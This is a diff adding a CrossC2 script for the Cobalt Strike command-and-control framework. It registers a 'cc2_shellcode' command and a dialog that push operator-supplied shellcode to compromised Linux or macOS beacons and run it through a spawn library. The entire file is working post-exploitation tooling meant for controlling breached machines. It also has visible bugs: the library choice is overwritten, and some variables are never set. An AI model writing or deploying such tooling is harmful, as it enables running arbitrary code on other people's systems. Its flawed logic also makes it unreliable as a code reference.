@@ -1,0 +1,66 @@
+sub bshellcode{
+    $bid = $1;
+    $shellcode = $2;
+    $taskName = "cc2_spawn"; # taskName
+    $taskType = "so";  # $taskType -> ELF, MachO, so, dylib
+    $taskResType = "info"; # info -> normal message
+    blog($bid, $shellcode);
+    $transportArg = $shellcode."^";
+
+    $os = lc(beacon_info($bid, "os"));
+    if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            $loadlib = "jobs/cc2_jobs32.so";
+        } else if ($arch eq 'x64') {
+            $loadlib = "spawn/spawnas.so";
+        }
+    } else if ('macos' isin $os) {
+        $loadlib = "jobs/cc2_jobs.dylib";
+    }
+    $loadlib = "spawn/spawnas.so";
+
+    if ($loadlib) {
+        blog($bid, "run shellcode");
+        bcrossc2_load_dyn($bid, $taskType, $taskName, $taskResType, $loadlib, $transportArg);
+    } else {
+        berror($bid, "unsupport platform");
+    }
+
+}
+
+ssh_alias("cc2_shellcode", &bshellcode);
+
+ssh_command_register("cc2_shellcode", "CrossC2 Run shellcode", "\nUsage: cc2_shellcode \\x80\\x95\\x90....\\x90 ");
+
+sub openShellCodeDialogCallBack {
+    $shellcode = $3['shellcode'];
+    bshellcode($bid, $shellcode);
+}
+
+sub openShellCodeDialog {
+    $bid = $1;
+    $dialog = dialog("RunShellCode", %(bid => $bid, shellcode => "\\x90\\x90\\x90\\x90"), &openShellCodeDialogCallBack);
+    dialog_description($dialog, "run shellcode");
+
+    drow_text_big($dialog, "shellcode", "shellcode: ");
+
+    dbutton_action($dialog, "run");
+    dialog_show($dialog);
+}
+
+sub cc2_shellcode_status {
+    local('$bid $os $arch $system');
+    $bid = $1;
+    $os = lc(beacon_info($bid, "os"));
+    $arch = beacon_info($bid, "arch");
+    if ('macos' isin $os) {
+        return 'MacOS(intel)';
+    } else if ('linux' isin $os) {
+        if ($arch eq 'x86') {
+            return 'Linux32';
+        } else if ($arch eq 'x64') {
+            return 'Linux64';
+        }
+    }
+    return '';
+}
